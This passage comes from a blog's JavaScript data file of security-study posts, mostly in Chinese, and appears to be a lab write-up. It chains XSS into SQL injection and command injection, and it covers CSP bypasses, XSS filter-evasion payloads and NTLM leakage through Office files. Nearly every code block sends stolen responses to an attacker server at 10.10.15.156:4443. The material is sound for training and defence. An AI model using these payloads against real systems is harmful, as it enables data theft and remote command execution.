    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<p>这导致出现以下响应，证实内部 Web 应用程序存在 SQL 注入漏洞：</p>
<pre><code class="language-html">HTTP 500 - SQL Error</code></pre>
<p><strong>利用漏洞</strong> 我们将利用 SQL 注入漏洞绕过登录，提取数据库内容。</p>
<p>我们将首先绕过身份验证，这可以通过用户名来实现<code>' OR '1'='1'-- -</code>：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
var params = \`uname=\${encodeURIComponent("' OR '1'='1' -- -")}&amp;pass=x\`;
xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<p>登录后屏幕上会显示以下信息：</p>
<pre><code>(1, 'admin', 'InternalAdmin2023!', 'This is the default admin account.')</code></pre>
<p>数据似乎包含用户名、密码和账户描述。让我们通过导出整个用户表来确认这一点。我们可以像检测其他 SQL 注入漏洞一样，通过枚举常见的有效载荷来检测数据库系统。在本例中，我们处理的是一个<code>SQLite</code>数据库。由于输出中似乎有四列，我们可以使用以下有效载荷导出所有表：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
var params = \`uname=\${encodeURIComponent("' UNION SELECT 1,2,3,group_concat(tbl_name) FROM sqlite_master-- -")}&amp;pass=x\`;
xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<p>随后，我们可以导出该表的模式<code>users</code>：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
var params = \`uname=\${encodeURIComponent("' UNION SELECT 1,2,3,group_concat(sql) FROM sqlite_master WHERE name='users'-- -")}&amp;pass=x\`;
xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.14.144:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<p>由此揭示了以下数据库架构：</p>
<pre><code class="language-sql">CREATE TABLE \`users\` (
    \`id\` int(11) NOT NULL,
    \`username\` varchar(256) NOT NULL,
    \`password\` longtext NOT NULL,
    \`info\` longtext NOT NULL
)</code></pre>
<p>最后，我们可以使用以下有效负载迭代地导出用户表：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
var params = \`uname=\${encodeURIComponent("' UNION SELECT id,username,password,info FROM users-- -")}&amp;pass=x\`;
xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<p>表名有：users, <code>secretdata</code></p>
<pre><code>var xhr = new XMLHttpRequest();
var params = \`uname=\${encodeURIComponent("' UNION SELECT 1,2,3,group_concat(name) FROM pragma_table_info('secretdata')-- -")}&amp;pass=x\`;
xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<p><code>secretdata</code> 表里的 <code>data</code> 和<code>id</code>。</p>
<pre><code>var xhr = new XMLHttpRequest();
var params = \`uname=\${encodeURIComponent("' UNION SELECT 1,2,3,group_concat(id||':'||data) FROM secretdata-- -")}&amp;pass=x\`;
xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<h2>利用内部 Web 应用程序（二）</h2>
<p><strong>识别漏洞</strong> 识别过程与上一节讨论的过程基本相同。我们将使用相同的 XSS 基础有效载荷，并且管理端点包含对另一个内部 Web 应用程序的引用<code>https://internal.internal-webapps-2.htb</code>。我们可以使用以下有效载荷来窃取该内部 Web 应用程序的索引：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://internal.internal-webapps-2.htb/', false);
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<p>这将显示以下 HTML 内容，表明我们可以使用该 Web 应用程序来检查不同 Web 应用程序的状态：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260418165934.png" alt="Pasted image 20260418165934" />
<p>我们可以通过分析表单来确定 Web 应用程序究竟是如何实现此功能的，从而构建相应的 POST 请求：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
var params = \`webapp_selector=\${encodeURIComponent("https://internal-webapps-2.htb")}\`;
xhr.open('POST', 'https://internal.internal-webapps-2.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.14.144:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<p>这将导致以下响应：</p>
<pre><code>HTTP/1.1 200 OK</code></pre>
<p>让我们尝试一个不存在的域名，看看能否触发错误信息：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
var params = \`webapp_selector=\${encodeURIComponent("https://doesnotexist.htb")}\`;
xhr.open('POST', 'https://internal.internal-webapps-2.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.14.144:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<p>这将导致以下响应：</p>
<pre><code>curl: (6) Could not resolve host: doesnotexist.htb</code></pre>
<p>如我们所见，状态似乎是通过某种方式获取的<code>curl</code>。如果实现不当或缺乏适当的安全措施，则可能存在命令注入漏洞。我们可以通过向数据泄露服务器注入一条额外的 curl 命令来验证这一点：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
var params = \`webapp_selector=\${encodeURIComponent("| curl -k https://10.10.15.156:4443?pwn")}\`;
xhr.open('POST', 'https://internal.internal-webapps-2.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<p>之后，我们可以在数据泄露服务器上看到预期的请求，从而证实了命令注入漏洞的存在：</p>
<pre><code>Chenduoduo@htb[/htb]$ python3 server.py Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/) ... 10.129.136.40 - - [30/Nov/2025 13:31:33] "GET /?pwn HTTP/1.1" 200 - 10.129.136.40 - - [30/Nov/2025 13:31:33] "OPTIONS /log HTTP/1.1" 200 - 10.129.136.40 - - [30/Nov/2025 13:31:36] [i] POST body: {"data":"PCFET&lt;SNIP&gt;tbD4="} 10.129.136.40 - - [30/Nov/2025 13:31:36] "POST /log HTTP/1.1" 200 -</code></pre>
<p><strong>漏洞利用</strong> 我们可以在 XSS 攻击载荷中指定命令注入载荷，并将结果泄露到泄露服务器。因此，这种利用方式与其他命令注入漏洞并无二致。例如，我们可以执行以下命令<code>id</code>：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
var params = \`webapp_selector=\${encodeURIComponent("| id")}\`;
xhr.open('POST', 'https://internal.internal-webapps-2.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<p>结果包含在 base64 编码的响应中：</p>
<pre><code>uid=0(root) gid=0(root) groups=0(root)</code></pre>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
var params = \`webapp_selector=\${encodeURIComponent("| cat /* 2&gt;/dev/null | tr '\n' ' '")}\`;
xhr.open('POST', 'https://internal.internal-webapps-2.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send(params);</code></pre>
<h2>内容安全策略 (CSP)</h2>
<p>内容 安全策略 (CSP) 是一种纵深防御的安全措施，它通过限制跨站脚本 (XSS) 漏洞的可利用性来降低其严重性。CSP 在<code>Content-Security-Policy</code>响应头中配置。</p>
<h3>CSP 基础知识</h3>
<p>由多个指令组成。每个指令允许一个或多个值。浏览器会强制执行 CSP，并根据 CSP 阻止资源的加载或执行。本节将讨论一些示例指令。</p>
<p>例如，该 <code>script-src</code> 指令定义了 JavaScript 可以从哪些位置加载和执行；我们可以使用以下策略限制允许加载 JavaScript 代码的域：</p>
<p>http <code>Content-Security-Policy: script-src 'self' https://benignsite.htb</code></p>
<p>此内容安全策略 (CSP) 指示浏览器仅从与页面自身同源的源以及外部源加载 JavaScript <code>https://benignsite.htb</code>。因此，如果攻击者在 XSS 有效载荷中注入以下 JavaScript 代码，受害者的浏览器将不会加载该脚本，因此也不会执行它：</p>
<p>html <code>&lt;script src="https://exploitserver.htb/pwn.js"&gt;&lt;/script&gt;</code></p>
<p>但是，允许加载和执行以下脚本：</p>
<p>html <code>&lt;script src="/js/useful.js"&gt;&lt;/script&gt; &lt;script src="https://benignsite.htb/main.js"&gt;&lt;/script&gt;</code></p>
<p>此外，由于<code>unsafe-inline</code>未指定该值，它会阻止所有内联脚本。因此，以下潜在的 XSS 有效载荷均被阻止，从而不会执行：</p>
<p>html <code>&lt;script&gt;alert(1)&lt;/script&gt; &lt;img src=x onerror=alert(1) /&gt; &lt;a href="javascript:alert(1)"&gt;click&lt;/a&gt;</code></p>
<p>此外，还有其他一些常见指令：</p>
<ul><li><code>style-src</code>样式表的允许来源</li><li><code>img-src</code>允许的图片来源</li><li><code>object-src</code>允许的来源，例如对象<code>&lt;object&gt;</code>或<code>&lt;embed&gt;</code></li><li><code>connect-src</code>允许脚本发出 HTTP 请求的来源。例如，使用<code>XMLHttpRequest</code></li><li><code>default-src</code>：如果未显式设置其他指令，则使用此回退值。例如，如果<code>img-src</code>CSP 中不存在此指令，浏览器将使用此值来处理图像。</li><li><code>frame-ancestors</code>允许来源对页面进行框架嵌入，例如，在 <code>&lt;div&gt; </code>标签内\`<code>&lt;iframe&gt;</code><code>。此指令可用于防止</code><code>Clickjacking</code>\`攻击。</li><li>\`<code>form-action</code>\`表单提交允许的来源</li></ul>
<p>指令的其他值包括：</p>
<pre><code>- \`*\`所有来源均允许
- \`'none'\`不允许任何来源。
- \`*.benignsite.htb\`所有子域名\`benignsite.htb\`均允许访问。
- \`unsafe-inline\`允许行内元素
- \`unsafe-eval\`允许动态代码执行，例如 JavaScript 的\`eval\`函数
- \`sha256-407e1bf4a1472948aa7b15cafa752fcf8e90710833da8a59dd8ef8e7fe56f22d\`允许通过哈希值添加元素
- \`nonce-S0meR4nd0mN0nC3\`允许通过 nonce 添加元素</code></pre>
<p>有关其他 CSP 指令值，请查看此处提供的列表。</p>
<hr />
<h3>安全 CSP</h3>
<p>尽可能严格地执行内容安全策略 (CSP) 对确保 Web 应用程序的安全至关重要。一个好的方法是从一个严格的基准 CSP 开始，逐步放宽限制，直到 Web 应用程序按预期运行。一个好的基准 CSP 如下：</p>
<p>http <code>Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';</code></p>
<p>此内容安全策略 (CSP) 仅允许从同一源加载图像、样式表和脚本。它还仅允许 JavaScript 向同一源发送 HTTP 请求和表单提交，仅允许同一源的资源嵌入网页，并阻止加载任何其他资源。如果使用任何外部资源，则必须相应地调整此 CSP。</p>
<p>此外，必须移除 Web 应用程序使用的内联 JavaScript 代码，以防止其被阻止。这可以通过将其移动到脚本文件并加载来轻松实现。例如，考虑以下内联 JavaScript 代码：</p>
<p>html <code>&lt;script&gt; var poc = "test"; function submitForm(){     console.log(poc); } &lt;/script&gt; &lt;button id="submit" onclick="submitForm()"&gt;</code></p>
<p><code>test.js</code>提供的代码在功能上与创建包含以下内容的文件完全相同：</p>
<p>js <code>var poc = "test"; function submitForm(){     console.log(poc); } document.getElementById("submit").addEventListener('click', submitForm);</code></p>
<p>然后加载脚本：</p>
<p>html <code>&lt;script src="/test.js"&gt;&lt;/script&gt;</code></p>
<p>这样就可以移除所有内联 JavaScript 代码。</p>
<p>我们可以使用现有的在线工具来评估云安全策略 (CSP)，例如Google 提供的CSP 评估工具。有关如何编写安全 CSP 的更多详细信息，请参阅OWASP CSP 速查表。</p>
<h2>绕过弱 CSP</h2>
<hr />
<p>现在我们已经讨论了 CSP、CSP 指令和 CSP 指令值，接下来让我们讨论如何利用和绕过弱 CSP。</p>
<hr />
<h3>绕过弱 CSP</h3>
<p>网络安全策略 (CSP) 可以作为一种纵深防御措施，用于防止跨站脚本攻击 (XSS)。然而，即使 Web 应用程序实现了 CSP，也并不意味着它就能自动抵御所有 XSS 攻击。如果 CSP 存在漏洞，攻击者就有可能绕过它。因此，分析 Web 应用程序的 CSP 是否存在潜在的绕过漏洞至关重要。</p>
<p>让我们先来看下面的CSP：</p>
<p>http <code>Content-Security-policy: default-src 'none'; img-src 'self'; style-src *; font-src *; script-src 'self' https://*.google.com;</code></p>
<p>此 CSP 允许从源本身加载图像，从任何位置加载样式和字体，从源本身及其任何子域加载脚本<code>google.com</code>。由于该指令，所有其他资源都无法加载<code>default-src 'none'</code>。</p>
<p>假设我们尝试在 Web 应用程序中注入一个简单的警告弹出窗口作为概念验证：</p>
<p>html <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p>由于 CSP 的限制，不会显示警告弹出窗口；取而代之的是，浏览器的 JavaScript 控制台将打印以下错误消息：</p>
<p>html <code>Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self' https://*.google.com". Either the 'unsafe-inline' keyword, a hash ('sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI='), or a nonce ('nonce-...') is required to enable inline execution.</code></p>
<p>虽然这种防御技术乍看之下似乎很安全，但它可以通过 <a href="https://www.w3schools.com/js/js_json_jsonp.asp" target="_blank" rel="noreferrer">JSONP</a>绕过。JSONP 是一种可以跨不同来源检索数据而不会受到同源策略限制的技术。JSONP 的基本思想是使用<code>script</code>标签来跨来源检索数据，因为标签不受同源策略的限制。例如，假设一个 Web 应用程序<code>https://vulnerablesite.htb</code>想要从端点 <code>&lt;endpoint&gt;</code> 检索数据<code>https://someapi.htb/stats</code>，该端点返回以下 JSON 数据：</p>
<p>JSON <code>{'clicks': 1337}</code></p>
<p>如果 API 未配置 CORS，则由于同源策略的限制，Web 应用程序无法访问跨域请求的响应。但是，由于脚本标签不受同源策略的限制，Web 应用程序可以通过在其页面上使用以下 HTML 标签来加载数据：</p>
<p>html <code>&lt;script src="https://someapi.htb/stats"&gt;&lt;/script&gt;</code></p>
<p>然而，这本身并不实用，因为 Web 应用程序需要以某种方式处理数据。假设 Web 应用程序实现了一个<code>processData</code>用于此目的的函数。但是，目前没有办法将接收到的数据传递给该函数。这时，JSONP 就派上了用场。如果 API 支持 JSONP，它会读取发送数据的端点上的 GET 参数，并相应地调整响应。该参数通常称为 <code>get_data</code> <code>callback</code>。假设我们调用端点 <code>get_data</code> <code>https://someapi.htb/stats?callback=processData</code>。这将导致 API 发送以下响应：</p>
<p>js <code>processData({'clicks': 1337})</code></p>
<p>现在，Web应用程序可以在其页面上插入以下脚本标签：</p>
<p>html <code>&lt;script src="https://someapi.htb/stats?callback=processData"&gt;&lt;/script&gt;</code></p>
<p>这样一来，就可以对从 API 跨域获取的数据调用 Web 应用程序的<code>processData</code>功能，而不会违反同源策略或需要 CORS。</p>
<p>由于 JSONP 端点允许调用者指定要调用的函数，因此它们可用于动态创建由提供 JSONP 端点的域发送的 JavaScript 代码。因此，JSONP 可用于绕过内容安全策略 (CSP)。Google 提供了多个不同的 JSONP 端点。JSONBee <a href="https://github.com/zigoo0/JSONBee" target="_blank" rel="noreferrer">GitHub</a>代码库列出了许多可用于绕过 CSP 的 JSONP 端点。我们可以使用以下 Google JSONP 端点来绕过上述 CSP：</p>
<p>html <code>&lt;script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1);"&gt;&lt;/script&gt;</code></p>
<p>将此条目发布到留言簿会触发警告弹出窗口，从而绕过内容安全策略 (CSP)：</p>
<p>https://vulnerablesite.htb/view.php</p>
<img src="https://cdn.services-k8s.prod.aws.htb.systems/content/modules/235/xss/xss_csp_1.png" alt="Referenced image" />
<p>另一个常见的缺陷是假设<code>'self'</code>值本身是安全的。例如，考虑以下 CSP：</p>
<p>http <code>Content-Security-policy: default-src 'none'; img-src 'self'; style-src *; script-src 'self';</code></p>
<p>这次，脚本只能从源服务器本身加载。假设源服务器不提供 JSONP 端点，这看起来是安全的。但是，考虑这样一种情况：Web 应用程序允许用户上传文件。如果允许上传任意文件类型，攻击者就可以上传文件<code>.js</code>。然后，攻击者可以通过从源服务器本身加载上传的有效载荷来利用 XSS 漏洞：</p>
<p>html <code>&lt;script src="/uploads/avatag.jpg.js"&gt;&lt;/script&gt;</code></p>
<p>通常，对内容安全策略 (CSP) 的评估取决于具体的 CSP 本身以及 Web 应用程序的功能。正如我们所见，如果 Web 应用程序实现了文件上传功能，则将<code>script-src</code>指令设置为 true<code>'self'</code>可能不安全。因此，在具体 Web 应用程序的上下文中评估 CSP 至关重要。</p>
<p>&lt;scriPt sRc="https://exploitserver.htb/exploit"&gt;&lt;/scripT&gt;</p>
<h2>XSS 过滤器绕过</h2>
<p><strong>实现JavaScript执行</strong> 在讨论如何绕过 XSS 过滤器之前，我们将探讨三种实现 JavaScript 代码执行的方法。</p>
<p>实现代码执行最常见（也最显而易见）的方法是使用 <code>script</code> 标签；Web 浏览器会执行其中包含的任何 JavaScript 代码：</p>
<ul><li><strong>脚本标签</strong></li></ul>
<pre><code class="language-html">&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
<p>我们可以使用伪协议（例如<code>javascript</code>或 <code>data</code>）来指定某些 HTML 属性中数据的加载位置，从而实现 JavaScript 代码的执行。例如，我们可以将 <code>a</code>标签的目标设置为<code>javascript</code>伪协议，这样当点击链接时，相应的 JavaScript 代码就会被执行：</p>
<ul><li><strong>伪协议</strong></li></ul>
<pre><code class="language-html">&lt;a href="javascript:alert(1)"&gt;click&lt;/a&gt;</code></pre>
<p>我们也可以创建带有伪协议的 XSS 有效载荷，这些协议不需要用户操作。例如，使用<code>object</code>标签。 <code>data</code>伪协议允许我们指定纯 HTML 代码或 base64 编码的 HTML 代码：</p>
<pre><code class="language-html">&lt;object data="javascript:alert(1)"&gt;
&lt;object data="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"&gt;
&lt;object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&gt;</code></pre>
<p>第三，我们可以使用事件处理程序如 <code>onload</code> 或 <code>onerror</code> 来指定在事件处理程序被触发时执行的 JavaScript 代码：</p>
<ul><li><strong>Event Handlers 事件处理程序</strong></li></ul>
<pre><code class="language-html">&lt;img src=x onerror=alert(1)&gt;
&lt;svg onload=alert(1)&gt;</code></pre>
<p>我们有许多事件处理工具可以用于此目的。PortSwigger 的 XSS 速查表提供了很好的概述。</p>
<h3>绕过基本黑名单</h3>
<p>假设一个网页应用实现了一个简单的黑名单，用来阻止可能导致 JavaScript 代码执行的关键词。例如，通过阻挡像<code>JavaScript</code>标签这样的 HTML 标签、像 <code>JavaScript</code> 和 <code>data</code> 这样的伪协议，以及像 <code>onload</code> 和 <code>onerror</code> 这样的事件处理程序。</p>
<p>在这种情况下，我们可以尝试一些方法来绕过天真的黑名单。例如，HTML 标签、伪协议和事件处理程序中的外壳是无关紧要的。更具体地说，我们可以混合使用小写和大写字母，绕过只屏蔽小写关键词的黑名单：</p>
<pre><code class="language-html">&lt;ScRiPt&gt;alert(1);&lt;/ScRiPt&gt;
&lt;object data="JaVaScRiPt:alert(1)"&gt;
&lt;img src=x OnErRoR=alert(1)&gt;</code></pre>
<p>此外，如果一个天真黑名单去除了所有关键词 <code>&lt;script&gt;</code> 的出现，但没有递归应用，我们可以用类似以下有效载荷绕过该过滤器：</p>
<pre><code class="language-html">&lt;scr&lt;script&gt;ipt&gt;alert(1);&lt;/scr&lt;script&gt;ipt&gt;</code></pre>
<p>最后，如果黑名单使用了对 HTML 标签语法假设或仅阻塞某些特殊字符的弱正则表达式，我们可能通过打破这些假设绕过黑名单。例如，如果黑名单在任何事件处理程序或输入字段不允许之前有空格，以下有效载荷可能会绕过该过滤器：</p>
<pre><code class="language-html">&lt;svg/onload=alert(1)&gt;
&lt;script/src="https://exploit.htb/exploit"&gt;&lt;/script&gt;</code></pre>
<h3>高级绕过</h3>
<p>假设我们注入一个 HTML 标签，从而执行 JavaScript 代码。在这种情况下，我们可能需要绕过附加于 JavaScript 代码的额外过滤器，这些过滤器限制了我们能调用哪些函数或访问哪些数据。我们可以采用许多技术来尝试绕过这些过滤器。我们将探讨如何通过编码字符串并将这些字符串传递到<code>execution sinks</code>来执行 JavaScript 代码来绕过过滤器。</p>
<p>在 JavaScript 中，我们可以为字符串应用多种编码，帮助我们规避黑名单。以下是字符串 <code>“alert（1）”</code> 的不同编码方式：</p>
<pre><code class="language-js"># Unicode
"\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029"

# Octal Encoding
"\141\154\145\162\164\50\61\51"

# Hex Encoding
"\x61\x6c\x65\x72\x74\x28\x31\x29"

# Base64 Encoding
atob("YWxlcnQoMSk=")</code></pre>
<p>为了以串联方式提供有效载荷，我们需要能够使用报价。如果过滤器移除或阻塞引号，我们可以使用以下技巧之一来创建包含有效载荷的字符串：</p>
<pre><code class="language-js"># String.fromCharCode
String.fromCharCode(97,108,101,114,116,40,49,41)

# .source
/alert(1)/.source

# URL Encoding
decodeURI(/alert(%22xss%22)/.source)</code></pre>
<p>到目前为止，我们只能以串方式供应有效载荷;然而，浏览器只有在将它传递到接收字符串作为输入的执行汇入时才会执行。此类执行汇最著名的例子是<code>eval</code>  函数;除了<code>eval</code> ，其他执行汇总还包括：</p>
<pre><code class="language-js">eval("alert(1)")
setTimeout("alert(1)")
setInterval("alert(1)")
Function("alert(1)")()
[].constructor.constructor(alert(1))()</code></pre>
<p>最后，我们可以将执行汇与编码字符串结合，尝试绕过弱的 XSS 滤波器：</p>
<pre><code class="language-js">eval("\141\154\145\162\164\50\61\51")
setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41))
Function(atob("YWxlcnQoMSk="))()</code></pre>
<blockquote><strong>注：</strong> 为了在现实世界中绕过 XSS 过滤器，我们可以应用与其他漏洞（如 SQL 注入或命令注入）相同的方法。实际的绕过取决于网页应用实现的过滤器。它需要仔细测试，识别哪些关键词被列入白名单或黑名单，才能设计出未被阻挡的漏洞利用。</blockquote>
<p>想了解更多 XSS 滤波绕过，请查看 OWASP 的 XSS 滤波规避速查表 。此外，还有针对不同类型滤波器的 XSS 有效载荷集合。例如，如果无法使用括号，我们可以引用不带括号的 XSS 有效载荷集合。此外，HTML 5 安全速查表还提供了更多针对 XSS 利用的浏览器特定示例。</p>
<h2>技能评估</h2>`
    }
  },
{
    id: "ntlm-credential-leakage",
    href: "posts/ad/ntlm-credential-leakage.html",
    title: {
      "en": "NTLM Credential Leakage and Privilege Escalation Paths",
      "zh": "NTLM 凭据泄露与提权路径"
    },
    category: "ad",
    categoryLabel: {
      "en": "Active Directory",
      "zh": "活动目录"
    },
    description: {
      "en": "A structured learning note about NTLM leakage through Office documents, Outlook, Access, Media Player playlists, and Publisher.",
      "zh": "整理 Word、Outlook、Access、Media Player 与 Publisher 远程资源加载导致 NTLM 泄露的路径。"
    },
    date: "2026-05-07",
    content: {
      "en": "A structured learning note about NTLM leakage through Office documents, Outlook, Access, Media Player playlists, and Publisher.",
      "zh": "整理 Word、Outlook、Access、Media Player 与 Publisher 远程资源加载导致 NTLM 泄露的路径。"
    },
    code: "remote resource -> SMB authentication -> NTLM hash capture -> relay / pass-the-hash / cracking",
    contentHtml: {
      en: String.raw`<p>NTLM remains deeply embedded in Windows environments as a compatibility fallback. Attackers abuse that fallback by causing applications to load remote resources over SMB, which can trigger automatic NTLM authentication and leak NetNTLM material.</p>
<h2>Introduction</h2>
<p>NTLM leakage can support offline cracking, NTLM relay, pass-the-hash style access, or further credential theft. If the leaked identity is privileged, the impact can extend to remote administration, Kerberos abuse, DCSync, and domain escalation.</p>
<h2>1. Microsoft Word - NTLM Leakage through Malicious RTF Auto Links</h2>
<img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063448.png" alt="Word protected view" />
<p>An attacker can embed automatic OLE links inside an RTF document. After editing is enabled, Word may check remote linked objects and trigger SMB authentication even when the user rejects an external-link prompt.</p>
<h2>2. Microsoft Outlook - NTLM Leakage through Remote Image Tags</h2>
<img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063704.png" alt="Outlook remote image tag" />
<p>HTML email can reference remote resources. When a message comes from a trusted sender, Outlook may load content automatically. If the resource points to an attacker-controlled SMB server, the client can leak NTLM authentication material.</p>
<h2>3. Microsoft Access - NTLM Leakage through Remote Table Refresh</h2>
<img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411064108.png" alt="Access active content warning" />
<p>Access databases can reference remote tables. Queries or AutoExec logic may validate or access the remote table before the user enables active content, which can trigger NTLM authentication.</p>
<h2>4. Microsoft Media Player - NTLM Leakage through Legacy Playlist Files</h2>
<img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411064236.png" alt="Media player playlist attachment" />
<p>Legacy playlist formats such as <code>.wax</code>, <code>.wvx</code>, and <code>.wmx</code> can reference remote media streams. Opening the file can cause Windows Media Player to retrieve media from an SMB path and leak NTLM credentials.</p>
<h2>5. Microsoft Publisher - NTLM Leakage through Remote Recipient Lists</h2>
<p>Publisher mail merge features can reference remote recipient lists. The application may check whether the remote file exists before asking for permission to access external data, which is enough to trigger authentication.</p>
<h2>Defensive Notes</h2>
<ul><li>Block outbound SMB to the Internet.</li><li>Reduce or disable NTLM where possible.</li><li>Enable SMB signing and relay mitigations where appropriate.</li><li>Harden Office and Outlook external-content policies.</li><li>Monitor unusual outbound 445/139 traffic.</li></ul>`,
      zh: String.raw`<p>就像过去顽固的遗物，挥之不去——这是一个有着几十年历史的身份验证协议，看似已被弃用，但仍然潜伏在每个 Windows 环境的阴影中。 尽管多年来微软一直努力用更安全的替代方案（例如 Kerberos）来取代 NTLM，但它仍然是一个关键的备用机制，微软无法完全弃用它。为什么？</p>
<p>由于它深深嵌入到生态系统中，移除它可能会导致无数遗留应用程序和工作流程崩溃。攻击者正是利用这种备用依赖关系，反复使用各种技术来攻击协议固有的弱点。</p>
<h2>介绍</h2>
<p>近年来, 攻击者专注于通过NTLM泄漏漏洞来提升权限. 微软Outlook应用程序尤其成为初始访问的主要目标，因为它频繁且通常是静默的网络连接可能会触发意外的NTLM身份验证。</p>
<p>一旦攻击者获取了泄露的 NTLM 哈希值，其影响可能是毁灭性的。破解哈希值以获取明文密码并非总是必要；NTLM 哈希值本身可以直接用于<strong>哈希传递攻击</strong>。这使得攻击者无需知道用户密码即可进行身份验证，利用哈希值进行<strong>远程 PsExec、WMI 或 RDP 访问</strong>，甚至泄露之前无法获取的其他凭据。如果 NTLM 哈希值属于特权用户，攻击者可以执行<strong>DCSync 攻击</strong>、请求新的 Kerberos 票证或在域内提升权限。</p>
<h2>1. Microsoft Word：通过恶意 RTF 自动链接泄露 NTLM 身份验证信息</h2>
<p><strong>想象一下，你收到一个名为invoice.rtf</strong>的 Word 文档。乍一看，该文档以受<strong>保护视图</strong>打开，并启用了“只读”模式，以防止潜在的恶意内容。</p>
